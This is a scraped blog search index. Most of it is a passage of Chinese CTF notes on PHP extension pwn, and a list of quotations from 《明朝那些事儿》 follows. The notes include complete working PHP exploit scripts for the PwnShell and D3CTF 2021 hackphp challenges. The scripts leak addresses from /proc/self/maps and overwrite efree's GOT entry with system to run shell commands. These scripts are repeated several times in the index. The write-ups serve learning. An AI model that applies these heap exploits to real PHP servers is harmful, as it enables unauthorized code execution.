","date":"2026-02-02","objectID":"/posts/phppwn_note/:2:5","tags":null,"title":"Phppwn笔记","uri":"/posts/phppwn_note/#容器与wsl2之间进行调试"},{"categories":["pwn"],"collections":null,"content":"例题\r","date":"2026-02-02","objectID":"/posts/phppwn_note/:3:0","tags":null,"title":"Phppwn笔记","uri":"/posts/phppwn_note/#例题"},{"categories":["pwn"],"collections":null,"content":"堆off by null：PwnShell\r堆菜单题 addHacker：参数是两个str，申请两个堆块，结构如下 //堆结构 chunkList[idx] → heap2 ┌──────────────────────────┐ │ [0] = pointer to heap1 │ │ [1] = len_string_1 │ │ [2] ← string_2 │ \u003c- off-by-null └──────────────────────────┘ ↑ │ │ ┌──────────────────────────┐ │ heap1 │ │ [data] ← valu_1-\u003eval+4 │ └──────────────────────────┘ removeHacker：参数为lval，efree掉相应chunklist中的堆块 editHacker：参数一个lval，一个str。如果要写入的数据比原先heap1的少，就用原先的heap；否则free掉原来的heap1，申请一个堆块放数据 交互： function add($a, $b){ addHacker($a, $b); } function rm($a){ removeHacker($a); } function edit($a, $b){ editHacker($a, $b); } add(\"abcdefghk\", \"bbbbbbb\"); edit(0,\"aaaaaa\"); rm(0); 思路： 主要漏洞在addHacker中，存在off-by-null *((_BYTE *)heap2 + len_2 + 16) = 0; 可以利用这个漏洞修改0x18大小的slot链表 修改前： 修改后： 接着让0x7daecbe57100指向_efree_got，申请几次0x18大小的堆，改efree_got为system exp\r打的本地，远程改改system偏移，执行/readflag就行 \u003c?php function str2Hex($str) { $hex = \"\"; for ($i = strlen($str) - 1;$i \u003e= 0;$i--) $hex.= dechex(ord($str[$i])); $hex = strtoupper($hex); return $hex; } function int2Str($i, $x = 8) { $re = \"\"; for ($j = 0; $j \u003c $x; $j++) { $re .= pack('C', $i \u0026 0xff); $i \u003e\u003e= 8; } return $re; } function p64($value) { return pack(\"Q\", $value); // 64-bit little-endian } function p32($value) { return pack(\"V\", $value); // 32-bit little-endian } function u64($data) { return unpack(\"Q\", $data)[1]; // 64-bit little-endian } function u32($data) { return unpack(\"V\", $data)[1]; // 32-bit little-endian } function leakaddr($buffer){ global $libc, $mbase, $anon_maps; $p = '/([0-9a-f]+)\\-[0-9a-f]+ .* \\/usr\\/lib\\/x86_64-linux-gnu\\/libc.so.6/'; // $p1 = '/([0-9a-f]+)\\-[0-9a-f]+ .* \\/usr\\/local\\/lib\\/php\\/extensions\\/no-debug-non-zts-20230831\\/vuln.so/'; $p1 = '/([0-9a-f]+)\\-[0-9a-f]+ .* \\/usr\\/lib\\/php\\/20230831\\/vuln.so/'; preg_match_all($p, $buffer, $libc); preg_match_all($p1, $buffer, $mbase); return \"\"; } $libc=\"\"; $mbase=\"\"; ob_start(\"leakaddr\"); include(\"/proc/self/maps\"); $buffer = ob_get_contents(); ob_end_flush(); leakaddr($buffer); $libc_base = hexdec($libc[1][0]); $mod_base = hexdec($mbase[1][0]); echo \"libc base: 0x\".dechex($libc_base).\"\\n\"; echo \"mod base: 0x\".dechex($mod_base).\"\\n\"; function add($a, $b){ addHacker($a, $b); } function rm($a){ removeHacker($a); } function edit($a, $b){ editHacker($a, $b); } $system = $libc_base + 0x58750; $efree_got = $mod_base + 0x4038; #先emalloc 0x10+后面，再emalloc 前面 # heap2 heap1 add(\"/bin/sh\", str_repeat(\"a\",7)); //0 add(str_repeat(\"b\",0x8), str_repeat(\"b\",7)); //1 add(str_repeat(\"c\",0x8), str_repeat(\"c\",7)); //2 add(str_repeat(\"d\",0x8), str_repeat(\"d\",8)); //3 //改_efree_got为system add(str_repeat(\"a\",0x10).p64($efree_got),str_repeat(\"a\",0x50)); add(str_repeat(\"a\",0x18),str_repeat(\"a\",0x50)); add(p64($system).p64(0).p64(0),str_repeat(\"b\",0x50)); edit(0,\"aaaaaaaaaaaaaaaaaaaa\"); //触发 // tele \u0026chunkList ","date":"2026-02-02","objectID":"/posts/phppwn_note/:3:1","tags":null,"title":"Phppwn笔记","uri":"/posts/phppwn_note/#堆off-by-nullpwnshell"},{"categories":["pwn"],"collections":null,"content":"堆off by null：PwnShell\r堆菜单题 addHacker：参数是两个str，申请两个堆块，结构如下 //堆结构 chunkList[idx] → heap2 ┌──────────────────────────┐ │ [0] = pointer to heap1 │ │ [1] = len_string_1 │ │ [2] ← string_2 │ \u003c- off-by-null └──────────────────────────┘ ↑ │ │ ┌──────────────────────────┐ │ heap1 │ │ [data] ← valu_1-\u003eval+4 │ └──────────────────────────┘ removeHacker：参数为lval，efree掉相应chunklist中的堆块 editHacker：参数一个lval，一个str。如果要写入的数据比原先heap1的少，就用原先的heap；否则free掉原来的heap1，申请一个堆块放数据 交互： function add($a, $b){ addHacker($a, $b); } function rm($a){ removeHacker($a); } function edit($a, $b){ editHacker($a, $b); } add(\"abcdefghk\", \"bbbbbbb\"); edit(0,\"aaaaaa\"); rm(0); 思路： 主要漏洞在addHacker中，存在off-by-null *((_BYTE *)heap2 + len_2 + 16) = 0; 可以利用这个漏洞修改0x18大小的slot链表 修改前： 修改后： 接着让0x7daecbe57100指向_efree_got，申请几次0x18大小的堆，改efree_got为system exp\r打的本地，远程改改system偏移，执行/readflag就行 \u003c?php function str2Hex($str) { $hex = \"\"; for ($i = strlen($str) - 1;$i \u003e= 0;$i--) $hex.= dechex(ord($str[$i])); $hex = strtoupper($hex); return $hex; } function int2Str($i, $x = 8) { $re = \"\"; for ($j = 0; $j \u003c $x; $j++) { $re .= pack('C', $i \u0026 0xff); $i \u003e\u003e= 8; } return $re; } function p64($value) { return pack(\"Q\", $value); // 64-bit little-endian } function p32($value) { return pack(\"V\", $value); // 32-bit little-endian } function u64($data) { return unpack(\"Q\", $data)[1]; // 64-bit little-endian } function u32($data) { return unpack(\"V\", $data)[1]; // 32-bit little-endian } function leakaddr($buffer){ global $libc, $mbase, $anon_maps; $p = '/([0-9a-f]+)\\-[0-9a-f]+ .* \\/usr\\/lib\\/x86_64-linux-gnu\\/libc.so.6/'; // $p1 = '/([0-9a-f]+)\\-[0-9a-f]+ .* \\/usr\\/local\\/lib\\/php\\/extensions\\/no-debug-non-zts-20230831\\/vuln.so/'; $p1 = '/([0-9a-f]+)\\-[0-9a-f]+ .* \\/usr\\/lib\\/php\\/20230831\\/vuln.so/'; preg_match_all($p, $buffer, $libc); preg_match_all($p1, $buffer, $mbase); return \"\"; } $libc=\"\"; $mbase=\"\"; ob_start(\"leakaddr\"); include(\"/proc/self/maps\"); $buffer = ob_get_contents(); ob_end_flush(); leakaddr($buffer); $libc_base = hexdec($libc[1][0]); $mod_base = hexdec($mbase[1][0]); echo \"libc base: 0x\".dechex($libc_base).\"\\n\"; echo \"mod base: 0x\".dechex($mod_base).\"\\n\"; function add($a, $b){ addHacker($a, $b); } function rm($a){ removeHacker($a); } function edit($a, $b){ editHacker($a, $b); } $system = $libc_base + 0x58750; $efree_got = $mod_base + 0x4038; #先emalloc 0x10+后面，再emalloc 前面 # heap2 heap1 add(\"/bin/sh\", str_repeat(\"a\",7)); //0 add(str_repeat(\"b\",0x8), str_repeat(\"b\",7)); //1 add(str_repeat(\"c\",0x8), str_repeat(\"c\",7)); //2 add(str_repeat(\"d\",0x8), str_repeat(\"d\",8)); //3 //改_efree_got为system add(str_repeat(\"a\",0x10).p64($efree_got),str_repeat(\"a\",0x50)); add(str_repeat(\"a\",0x18),str_repeat(\"a\",0x50)); add(p64($system).p64(0).p64(0),str_repeat(\"b\",0x50)); edit(0,\"aaaaaaaaaaaaaaaaaaaa\"); //触发 // tele \u0026chunkList ","date":"2026-02-02","objectID":"/posts/phppwn_note/:3:1","tags":null,"title":"Phppwn笔记","uri":"/posts/phppwn_note/#exp"},{"categories":["pwn"],"collections":null,"content":"堆UAF：hackphp\r题目来源：D3CTF 2021 hakphp 参考： https://github.com/UESuperGate/D3CTF-Source/blob/master/hackphp/exp.php https://www.anquanke.com/post/id/235237#h2-5 思路\rvoid __fastcall zif_hackphp_create(zend_execute_data *execute_data, zval *return_value) { zval *arg_num; // rdi __int64 size[3]; // [rsp+0h] [rbp-18h] BYREF arg_num = (zval *)execute_data-\u003eThis.u2.var_flags; size[1] = __readfsqword(0x28u); if ( (unsigned int)zend_parse_parameters(arg_num, \u0026unk_2000, size) != -1 ) { buf = (char *)_emalloc(size[0]); buf_size = size[0]; if ( buf ) { if ( (unsigned __int64)(size[0] - 0x100) \u003c= 0x100 ) { return_value-\u003eu1.type_info = 3; return; } _efree(); } } return_value-\u003eu1.type_info = 2; } 这里申请一个大于0x200的堆块后，存在UAF，就可以修改slot链表 str_repeat str_repeat会调用emalloc申请堆块，大小为（字符数+0x18）向上对齐一个slot 需要把str_repeat赋值给一个变量，不然这个堆块会被收回 $heap1 = str_repeat(\"A\",0x1f0);后，返回的是0x210大小的堆块，内存布局： pwndbg\u003e dq 0x7e0878471000 0x7e0878471000: 0x0000000600000001 0x0000000000000000 0x7e0878471010: 0x00000000000001f0 0x4141414141414141 0x7e0878471020: 0x4141414141414141 0x4141414141414141 0x7e0878471030: 0x4141414141414141 0x4141414141414141 这里选择修改efree_got为system，然后free掉一个存储字符串/readflag的堆块 exp\r\u003c?php $heap_base = 0; $libc_base = 0; $libc = \"\"; $mbase = \"\"; function p64($value) { return pack(\"Q\", $value); } function p32($value) { return pack(\"V\", $value); } function u64($data) { return unpack(\"Q\", $data)[1]; } function u32($data) { return unpack(\"V\", $data)[1]; } function leakaddr($buffer){ global $libc, $mbase; $p = '/([0-9a-f]+)\\-[0-9a-f]+ .* \\/usr\\/lib\\/x86_64-linux-gnu\\/libc-2.31.so/'; $p1 = '/([0-9a-f]+)\\-[0-9a-f]+ .* \\/usr\\/local\\/lib\\/php\\/extensions\\/no-debug-non-zts-20190902\\/hackphp.so/'; preg_match_all($p, $buffer, $libc); preg_match_all($p1, $buffer, $mbase); return \"\"; } ob_start(\"leakaddr\"); include(\"/proc/self/maps\"); $buffer = ob_get_contents(); ob_end_flush(); leakaddr($buffer); $libc_base = hexdec($libc[1][0]); $modBase = hexdec($mbase[1][0]); $system = $libc_base + 0x52290; $efree_got = $modBase + 0x4070; echo \"libc_base:0x\" . dechex($libc_base) . \"\\n\"; echo \"modBase:0x\" . dechex($modBase) . \"\\n\"; hackphp_create(0x210); hackphp_edit(p64($modBase+0x4178-0x28)); $heap1 = str_repeat(\"A\",0x1f0); $heap1 = str_repeat(p64($modBase+0x4070),(0x1f0)/8); hackphp_edit(p64($system)); hackphp_create(0x100); hackphp_edit(\"/readflag\"); hackphp_delete(); ","date":"2026-02-02","objectID":"/posts/phppwn_note/:3:2","tags":null,"title":"Phppwn笔记","uri":"/posts/phppwn_note/#堆uafhackphp"},{"categories":["pwn"],"collections":null,"content":"堆UAF：hackphp\r题目来源：D3CTF 2021 hakphp 参考： https://github.com/UESuperGate/D3CTF-Source/blob/master/hackphp/exp.php https://www.anquanke.com/post/id/235237#h2-5 思路\rvoid __fastcall zif_hackphp_create(zend_execute_data *execute_data, zval *return_value) { zval *arg_num; // rdi __int64 size[3]; // [rsp+0h] [rbp-18h] BYREF arg_num = (zval *)execute_data-\u003eThis.u2.var_flags; size[1] = __readfsqword(0x28u); if ( (unsigned int)zend_parse_parameters(arg_num, \u0026unk_2000, size) != -1 ) { buf = (char *)_emalloc(size[0]); buf_size = size[0]; if ( buf ) { if ( (unsigned __int64)(size[0] - 0x100) \u003c= 0x100 ) { return_value-\u003eu1.type_info = 3; return; } _efree(); } } return_value-\u003eu1.type_info = 2; } 这里申请一个大于0x200的堆块后，存在UAF，就可以修改slot链表 str_repeat str_repeat会调用emalloc申请堆块，大小为（字符数+0x18）向上对齐一个slot 需要把str_repeat赋值给一个变量，不然这个堆块会被收回 $heap1 = str_repeat(\"A\",0x1f0);后，返回的是0x210大小的堆块，内存布局： pwndbg\u003e dq 0x7e0878471000 0x7e0878471000: 0x0000000600000001 0x0000000000000000 0x7e0878471010: 0x00000000000001f0 0x4141414141414141 0x7e0878471020: 0x4141414141414141 0x4141414141414141 0x7e0878471030: 0x4141414141414141 0x4141414141414141 这里选择修改efree_got为system，然后free掉一个存储字符串/readflag的堆块 exp\r\u003c?php $heap_base = 0; $libc_base = 0; $libc = \"\"; $mbase = \"\"; function p64($value) { return pack(\"Q\", $value); } function p32($value) { return pack(\"V\", $value); } function u64($data) { return unpack(\"Q\", $data)[1]; } function u32($data) { return unpack(\"V\", $data)[1]; } function leakaddr($buffer){ global $libc, $mbase; $p = '/([0-9a-f]+)\\-[0-9a-f]+ .* \\/usr\\/lib\\/x86_64-linux-gnu\\/libc-2.31.so/'; $p1 = '/([0-9a-f]+)\\-[0-9a-f]+ .* \\/usr\\/local\\/lib\\/php\\/extensions\\/no-debug-non-zts-20190902\\/hackphp.so/'; preg_match_all($p, $buffer, $libc); preg_match_all($p1, $buffer, $mbase); return \"\"; } ob_start(\"leakaddr\"); include(\"/proc/self/maps\"); $buffer = ob_get_contents(); ob_end_flush(); leakaddr($buffer); $libc_base = hexdec($libc[1][0]); $modBase = hexdec($mbase[1][0]); $system = $libc_base + 0x52290; $efree_got = $modBase + 0x4070; echo \"libc_base:0x\" . dechex($libc_base) . \"\\n\"; echo \"modBase:0x\" . dechex($modBase) . \"\\n\"; hackphp_create(0x210); hackphp_edit(p64($modBase+0x4178-0x28)); $heap1 = str_repeat(\"A\",0x1f0); $heap1 = str_repeat(p64($modBase+0x4070),(0x1f0)/8); hackphp_edit(p64($system)); hackphp_create(0x100); hackphp_edit(\"/readflag\"); hackphp_delete(); ","date":"2026-02-02","objectID":"/posts/phppwn_note/:3:2","tags":null,"title":"Phppwn笔记","uri":"/posts/phppwn_note/#思路"},{"categories":["pwn"],"collections":null,"content":"堆UAF：hackphp\r题目来源：D3CTF 2021 hakphp 参考： https://github.com/UESuperGate/D3CTF-Source/blob/master/hackphp/exp.php https://www.anquanke.com/post/id/235237#h2-5 思路\rvoid __fastcall zif_hackphp_create(zend_execute_data *execute_data, zval *return_value) { zval *arg_num; // rdi __int64 size[3]; // [rsp+0h] [rbp-18h] BYREF arg_num = (zval *)execute_data-\u003eThis.u2.var_flags; size[1] = __readfsqword(0x28u); if ( (unsigned int)zend_parse_parameters(arg_num, \u0026unk_2000, size) != -1 ) { buf = (char *)_emalloc(size[0]); buf_size = size[0]; if ( buf ) { if ( (unsigned __int64)(size[0] - 0x100) \u003c= 0x100 ) { return_value-\u003eu1.type_info = 3; return; } _efree(); } } return_value-\u003eu1.type_info = 2; } 这里申请一个大于0x200的堆块后，存在UAF，就可以修改slot链表 str_repeat str_repeat会调用emalloc申请堆块，大小为（字符数+0x18）向上对齐一个slot 需要把str_repeat赋值给一个变量，不然这个堆块会被收回 $heap1 = str_repeat(\"A\",0x1f0);后，返回的是0x210大小的堆块，内存布局： pwndbg\u003e dq 0x7e0878471000 0x7e0878471000: 0x0000000600000001 0x0000000000000000 0x7e0878471010: 0x00000000000001f0 0x4141414141414141 0x7e0878471020: 0x4141414141414141 0x4141414141414141 0x7e0878471030: 0x4141414141414141 0x4141414141414141 这里选择修改efree_got为system，然后free掉一个存储字符串/readflag的堆块 exp\r\u003c?php $heap_base = 0; $libc_base = 0; $libc = \"\"; $mbase = \"\"; function p64($value) { return pack(\"Q\", $value); } function p32($value) { return pack(\"V\", $value); } function u64($data) { return unpack(\"Q\", $data)[1]; } function u32($data) { return unpack(\"V\", $data)[1]; } function leakaddr($buffer){ global $libc, $mbase; $p = '/([0-9a-f]+)\\-[0-9a-f]+ .* \\/usr\\/lib\\/x86_64-linux-gnu\\/libc-2.31.so/'; $p1 = '/([0-9a-f]+)\\-[0-9a-f]+ .* \\/usr\\/local\\/lib\\/php\\/extensions\\/no-debug-non-zts-20190902\\/hackphp.so/'; preg_match_all($p, $buffer, $libc); preg_match_all($p1, $buffer, $mbase); return \"\"; } ob_start(\"leakaddr\"); include(\"/proc/self/maps\"); $buffer = ob_get_contents(); ob_end_flush(); leakaddr($buffer); $libc_base = hexdec($libc[1][0]); $modBase = hexdec($mbase[1][0]); $system = $libc_base + 0x52290; $efree_got = $modBase + 0x4070; echo \"libc_base:0x\" . dechex($libc_base) . \"\\n\"; echo \"modBase:0x\" . dechex($modBase) . \"\\n\"; hackphp_create(0x210); hackphp_edit(p64($modBase+0x4178-0x28)); $heap1 = str_repeat(\"A\",0x1f0); $heap1 = str_repeat(p64($modBase+0x4070),(0x1f0)/8); hackphp_edit(p64($system)); hackphp_create(0x100); hackphp_edit(\"/readflag\"); hackphp_delete(); ","date":"2026-02-02","objectID":"/posts/phppwn_note/:3:2","tags":null,"title":"Phppwn笔记","uri":"/posts/phppwn_note/#exp-1"},{"categories":["pwn"],"collections":null,"content":"UAF：phpmaster\r题目来源：第二届长城杯半决赛 phpmaster 参考：https://bbs.kanxue.com/thread-286086.htm ","date":"2026-02-02","objectID":"/posts/phppwn_note/:3:3","tags":null,"title":"Phppwn笔记","uri":"/posts/phppwn_note/#uafphpmaster"},{"categories":["pwn"],"collections":null,"content":"长城杯2025 (php-pwn) simi-final php-master\r参考文章以及附件https://bbs.kanxue.com/thread-286567.htm ","date":"2026-02-02","objectID":"/posts/phppwn_note/:3:4","tags":null,"title":"Phppwn笔记","uri":"/posts/phppwn_note/#长城杯2025-php-pwn-simi-final-php-master"},{"categories":["pwn"],"collections":null,"content":"N1CTF 2024—php master\rhttps://www.ctfiot.com/213627.html php-exploit/n1ctf24-php-master at master · m4p1e/php-exploit https://xia0.sh/blog/save-me-web-master-pwn-n1ctf-2024-php-master/save-me-web-master-pwn-n1ctf-2024-php-master ","date":"2026-02-02","objectID":"/posts/phppwn_note/:3:5","tags":null,"title":"Phppwn笔记","uri":"/posts/phppwn_note/#n1ctf-2024php-master"},{"categories":["pwn"],"collections":null,"content":"R3CTF2025_not_a_web_chal\r","date":"2026-02-02","objectID":"/posts/phppwn_note/:3:6","tags":null,"title":"Phppwn笔记","uri":"/posts/phppwn_note/#r3ctf2025_not_a_web_chal"},{"categories":["pwn"],"collections":null,"content":"强网杯 2025 go2php\r","date":"2026-02-02","objectID":"/posts/phppwn_note/:3:7","tags":null,"title":"Phppwn笔记","uri":"/posts/phppwn_note/#强网杯-2025-go2php"},{"categories":["reading"],"collections":null,"content":"一本真正教人树立品性和信念的读物 ","date":"2026-01-26","objectID":"/posts/read_mcnxse/:0:0","tags":null,"title":"《明朝那些事儿》","uri":"/posts/read_mcnxse/#"},{"categories":["reading"],"collections":null,"content":"摘录\rQuote\r长期的困难生活，最能磨炼一个人的意志。有很多人在遇到困难后，只能怨天尤人，得过且过，而另外一些人虽然也不得不在困难面前低头，但他们的心从未屈服，他们不断地努力，相信一定能够取得最后的胜利。\rQuote\r即使你拥有人人羡慕的容貌、博览群书的才学、挥霍不尽的财富，也不能证明你的强大。因为心的强大，才是真正的强大。\rQuote\r一个人要显示自己的力量，从来不是靠暴力，挑战这一准则的人必然会被历史从强者的行列中淘汰，历来如此。\rQuote\r最强大的武器，不是军队的人数，不是强大的舰队，而是人心。\rQuote\r诸位可以借鉴，遇到恨透一个人、想要拿刀去砍人的时候，用张定边的事迹勉励一下自己，不要生气，修身养性，活得比他长就是了。\rQuote\r每一种主张的背后，都隐藏着某种势力或者利益的群体。\rQuote\r所有的书籍都有立场，所有的立场都有倾向。\rQuote\r这个世界上，最让人畏惧的就是未知，如果人人都知道自己的未来，他们就不会再害怕。\rQuote\r真正支配历史的人，不是朱元璋，而是稻田里辛勤劳作的老农，是官道上来往的商贾，是朝堂上进言的官员，是孤灯下苦读的学子。\rQuote\r简单的占有是小聪明，暂时的放弃才是大智慧。\rQuote\r他告诉我们，坚强的意志和决心可以战胜一切困难。他告诉我们，执着的信念和无畏的心灵才是最强大的武器。\rQuote\r读书的能力和处理问题的能力是不一样的。书读得好，不代表事情能处理得好；能列出计划，不代表能够执行计划。\rQuote\r榜样的力量是无穷的。\rQuote\r即使你的敌人无比强大，即使你没有好的应对方法，但只要你有敢于面对强敌的决心和勇气，你就会发现，奇迹是可以创造的。\rQuote\r失败算不了什么，希望的丧失才是最大的痛苦。\rQuote\r是的，从历史中我们可以知道，宽容从来都不是软弱。\rQuote\r为了名利去做一件事情也许可以获得动力和成功，但要成就大的事业，需要的是另一种决心和回答——为了读书而读书。\rQuote\r历史的真相始终是被笼罩在迷雾中的，无数人为了各种目的去修饰和歪曲它，以适应自己的需要。\rQuote\r强而不欺，威而不霸，是一个伟大国家和民族的气度与底蕴。\rQuote\r暴力可以成为解决问题的后盾，但绝对不能解决问题。\rQuote\r朝廷就是一个小社会，皇帝大臣们和地痞混混也没有什么区别，不过是吃得好点，穿得好点，人品更卑劣，斗争更加激烈点而已。\rQuote\r无论在多么绝望的情况下，也不要放弃希望，坚持下去，就一定能够创造奇迹。\rQuote\r在这个污浊的世界上，能够干干净净度过自己一生的人，是值得钦佩的。\rQuote\r在这世上，爱一个人不需要理由，从来都不需要。\rQuote\r当一个人不得不走向死亡时，自杀代表着尊严和抗争。\rQuote\r山近月远觉月小，便道此山大于月。 若人有眼大如天，当见山高月更阔。\rQuote\r“天下之大，虽离家万里，何处不可往！何事不可为！”王守仁大笑着。\rQuote\r只有夺走你所拥有的一切，你才能摆脱人世间之一切浮躁与诱惑，经受千锤百炼，心如止水，透悟天地。\rQuote\r要想实现崇高伟大的志向，必须有符合实际、脚踏实地的方法。\rQuote\r无善无恶心之体，有善有恶意之动。 知善知恶是良知，为善去恶是格物。\rQuote\r观点斗争是假的，方向斗争也是假的，只有权力斗争才是真的。\rQuote\r纵使憨直，诚然不屈，这就是明代官员的气节。\rQuote\r那些二十岁的青年人是不会懂得这些的，他们太天真、太幼稚，他们或许能够在考试中得到一百分，却不可能真正了解其中的含义。所以，他们虽然手握真理，却无法使用，满怀热情地踏入社会，却被撞得头破血流。\rQuote\r在这个残酷的现实面前，徐阶终于明白了知行合一的真意，无论有多么伟大正直的理想，要实现它，还必须懂得两个字——“变通”。只有变通，只有切合实际的行动，才能适应这个变化万千的世界。\rQuote\r只有真正了解这个世界的丑陋与污浊，被现实打击，被痛苦折磨，遍体鳞伤、无所遁形，却从未放弃对光明的追寻，依然微笑着坚定前行的人，才是真正的勇者。\rQuote\r所谓事可以做绝，话不能说绝，是也。\rQuote\r历经磨难，矢志不移，叫作信念。 不畏强权，虽死无惧，叫作勇气。\rQuote\r历史告诉我们，所谓道德与公理，只有在实力相等的情况下才能拿出来讨论。\rQuote\r所以他终于意识到，把自己的命运和信念寄托在一个人身上，是极其不靠谱的，亲密战友胡宗宪也不例外。\rQuote\r“鞠躬尽瘁，夕死无憾，此即长生之术！”\rQuote\r等待只因值得，隐忍只为爆发，要坚信，属于我们的机会终会到来。\rQuote\r从道士到钢铁战士，只是因为一件东西——信仰。在这个世界上，信仰是最为坚固的物体，一旦坚持，就很难动摇，而金钱、美色在它的面前，是极为软弱无力的。\rQuote\r原来人生可以如同地狱一般。在看过了无数百姓沿街乞讨、卖儿卖女，只求能够多吃一顿、多活一天的惨象后，张居正发出了这样的长叹。\rQuote\r所以我相信，即使这个世界十分阴晦、十分邪恶，即使它让你痛不欲生、生不如死，但依然应该鼓起勇气，勇敢地活下去。所以我相信，希望是不会死去的。\rQuote\r在封建时代，就做封建时代的事，说封建时代的话，别指望人家有多高的觉悟，这就叫历史唯物主义。\rQuote\r在这个世界上，所有存在的东西，必有其合理性，否则它就绝不会诞生。\rQuote\r把所有不服你的人都打服，敢出声就灭了他，所有人都认你当大哥，这就叫实现团结。\rQuote\r没有无缘无故的爱，也没有无缘无故的恨，原来如此。\rQuote\r我知道，我有极为坚强的意志，我的斗志不会衰竭，我的心志不会动摇，即使与全天下人为敌，我也决不妥协。\rQuote\r所有的英雄，都是平凡的人。千回百转，千锤百炼，矢志不改，如此而已。\rQuote\r你还很年轻，将来你会遇到很多人，经历很多事，得到很多，也会失去很多，但无论如何，有两样东西，你绝不能丢弃，一个叫良心，另一个叫理想。\rQuote\r在这个世界上，笨人的第一特征，就是自认为聪明。\rQuote\r义武奋扬，跳梁者，虽强必戮！\rQuote\r临战之时，国仇家恨，慷慨激昂，大家都激动。在这个时候，跟着激动一把，可谓是毫无成本，反正仗也不用自己打，还能落个爱国的名声，何乐而不为？\rQuote\r许多你曾无比熟悉的人，其实十分陌生；许多你曾坚信的事实，其实十分虚伪；而这，只不过是个开头。\rQuote\r很多人说过，最好的老师，不是特级教师，不是名牌学校，而是兴趣。但我要告诉你，这个答案是错误的。在这个世界上，最优秀的老师，是生存。\rQuote\r纯粹的人，是这个世界上最可怕的人。他们的一生，往往只有一个目标。为了达到这个目标，他们可以不择手段，不顾一切；他们无法被收买，无法被威逼，他们不要钱，不要女色，甚至不要权势和名声。\rQuote\r无论搞多少次普法教育，都是没用的，只要让大家都去监狱住两天，亲自实践，就不会再犯罪了。\rQuote\r政治的最高技巧，不是你死我活，而是妥协。\rQuote\r只有岁月的沧桑，才能淘尽一切污浊，扫清人们眼帘上的遮盖与灰尘，看到那些殉道者无比璀璨的光芒，历千年而不灭。\rQuote\r一个人应该坚持信念，至死也不动摇。\rQuote\r不要以为渺小的，就没有力量；不要以为卑微的，就没有尊严。弱者和强者之间唯一的差别，只在信念是否坚定。\rQuote\r我们的同志在困难的时候，要看到成绩，要看到光明，要提高我们的勇气。 ——毛泽东\rQuote\r军队应该具有一往无前的精神，它要压倒一切敌人，而决不被敌人所屈服。不论在任何艰难困苦的场合，只要还有一个人，这个人就要继续战斗下去。 ——毛泽东\rQuote\r只要你不放弃自己，上天就不会放弃你。\rQuote\r张牙舞爪的人，往往是脆弱的，因为真正强大的人，是自信的，自信就会温和，温和就会坚定。\rQuote\r我们之所以一直这样认为，只是因为有人这样告诉我们。之所以有人这样告诉我们，是因为他们希望我们这样认为。\rQuote\r其实很多时候，群众是好说话的，因为他们所需要的并非特权，而是公平。\rQuote\r《中庸》有云： “国有道，不变塞焉，国无道，至死不变。” 无论这个世界多么混乱，坚持自己的信念。 我钦佩这样的人。\rQuote\r所谓历史，就是过去的事，它的残酷之处在于：无论你哀号、悲伤、痛苦、流泪、落寞、追悔，它都无法改变。\rQuote\r人只活一辈子，如何生活，都是自己的事，自己这辈子浑浑噩噩地没活好，厚着脸皮还来指责别人，有多远，就去滚多远。\rQuote\r“男儿志在四方，当往天地间一展胸怀！”\rQuote\r其实这个世上很多事，本不需要理由，之所以需要理由，是因为很多人喜欢找抽，抽久了，就需要理由了。\rQuote\r因为我要告诉你，所谓千秋霸业，万古流芳，以及一切的一切，只是粪土。先变成粪，再变成土。\rQuote\r成功只有一个——按照自己的方式，去度过人生。\r","date":"2026-01-26","objectID":"/posts/read_mcnxse/:1:0","tags":null,"title":"《明朝那些事儿》","uri":"/posts/read_mcnxse/#摘录"},{"categories":["reading"],"collections":null,"content":"他人批注\rNote\r成功学之所以是谬论，是由于当你成功时，说什么都会变为有价值的学问，无论真假，总有人相信。世界可以有完美的人设，但是没有完美的人生。每个人只是在有限的时间，用有限的认知作出了自认为最正确的选择，而这一切的结果都指向未知。 多年之后回首，回到当年命运的选择路口，你会选择不一样的路途么？另外一条路途会成就一个与现在截然不同的自己么？不一定的。那么时常把过往和后悔挂在嘴边，就是完全没有意义，苍白且无力的辩解。每个人可以抓住的，只有当下的日拱一卒。结果，留给时间评判。\rNote\r以利相交，利尽则散，以权相交，权失则弃。以色相交，色衰爱弛。言传身教、以身作则，是作为管理者的首要法则。\rNote\r你还很年轻，先不要去美化自己以后的路，先想想自己不愿意成为怎样的人，去看看他们的缺点，去引以为戒。\rNote\r周国平先生曾说过这样一段话，“人生有三次成长：第一次是在发现自己不再是世界中心的时候；第二次是在发现即使再怎么努力，终究还是有些事令人无能为力的时候；第三次是在明知道有些事可能会无能为力，但还是会尽力争取的时候。”\rNote\r时间教会了我们很多东西，有一些我们曾经深信不疑的，后来却发现其实它根本就没有，有一些我们认为没有的，后来才发现其实它确确实实存在。\rNote\r斯宾诺莎曾经说过，“诚实的人从来讨厌虚伪的人，而虚伪的人却常常以诚实的面目出现。”\rNote\r少时初读《送东阳马生序》，不以为意，长大后才明白，别说读书太苦，那是我们去看世界的路。恋爱过才读懂，年少时以为爱情是山盟海誓的热烈、是奋不顾身的勇敢，但如果爱的卑微，也终是遍体鳞伤。升学考公时才想起范进中举，最初嘲笑范进，后来理解范进，终是成为范进；找工作时才读懂孔乙己，脱不下的长衫不正是我们在所谓的体面和生活之间反复挣扎的高台吗？谈婚论嫁时才读懂孔雀东南飞，原来生活的酸甜苦辣，喜怒哀乐早已注定在各自的原生家庭中！人生好像就是这样，岁月匆匆如流水，初读不知书中意，再见已是书中人，可是回不去的何止是时间呀，遥远的又何止是距离呢？还有那些身边渐行渐远的人，和那个曾经风华的自己，所以我们如果无能为力，那就顺其自然吧；如果心无所侍，那就随遇而安吧。年轻时执着什么都不为过，成熟时放弃什么都不是错，最后，愿你历尽千帆，不染岁月风尘，听风八百遍，才知是人间。\rNote\r“世界上所有的爱都以聚合为最终目的，只有一种爱以分离为目的，那就是父母对子女的爱。父母真正成功的爱，就是让孩子尽早作为一个独立的个体从你的生命中分离出去，这种分离越早，你就越成功。”——纪伯伦\rNote\r你欣赏的东西体现了你的品味和智趣，你讨厌的东西体现你的底线和原则。\rNote\r永远不要和一个智商低的人争论，他会把你的智商拉到和他一个水平，然后用丰富的经验打败你。\rNote\r永远不要为自己的不合群而内耗，总有人会欣赏你，会和你成为朋友。\rNote\r尼采曾说过，“越是向往高处的阳光，它的根就越要伸向黑暗的地底”。你不知道何为黑暗，也就不能明白光明的真正样子。正义向上的人，往往早已经看透了黑暗的本来面貌，在看透黑暗的本来面貌时仍能保持初心，那样才能是真正的正义向上。而强大的人必同时理解光明与黑暗的含义，向往光明的人，若不熟知何为黑暗，就会像根浅的树一样被人一推就倒。放到现实中就是：社会中有很多黑暗面，这些黑暗面往往带来了诱惑。当你像张白纸一